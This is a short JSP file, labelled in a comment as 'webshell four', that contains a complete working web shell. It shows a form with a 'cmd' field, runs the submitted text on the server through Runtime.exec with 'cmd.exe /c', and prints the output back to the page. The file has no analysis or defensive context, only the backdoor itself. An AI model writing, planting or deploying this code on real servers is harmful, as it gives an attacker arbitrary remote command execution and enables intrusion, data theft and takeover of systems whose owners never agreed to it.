<%@ page import="java.util.*,java.io.*,java.net.*"%>
<%
//webshell four
%>
<HTML><BODY>
<FORM METHOD="POST" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
String cmd=new String(request.getParameter("cmd").getBytes("ISO-8859-1"),"gb2312");
Process p = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
       out.println(disr); disr = dis.readLine(); 
}

%>
</pre>
</BODY></HTML>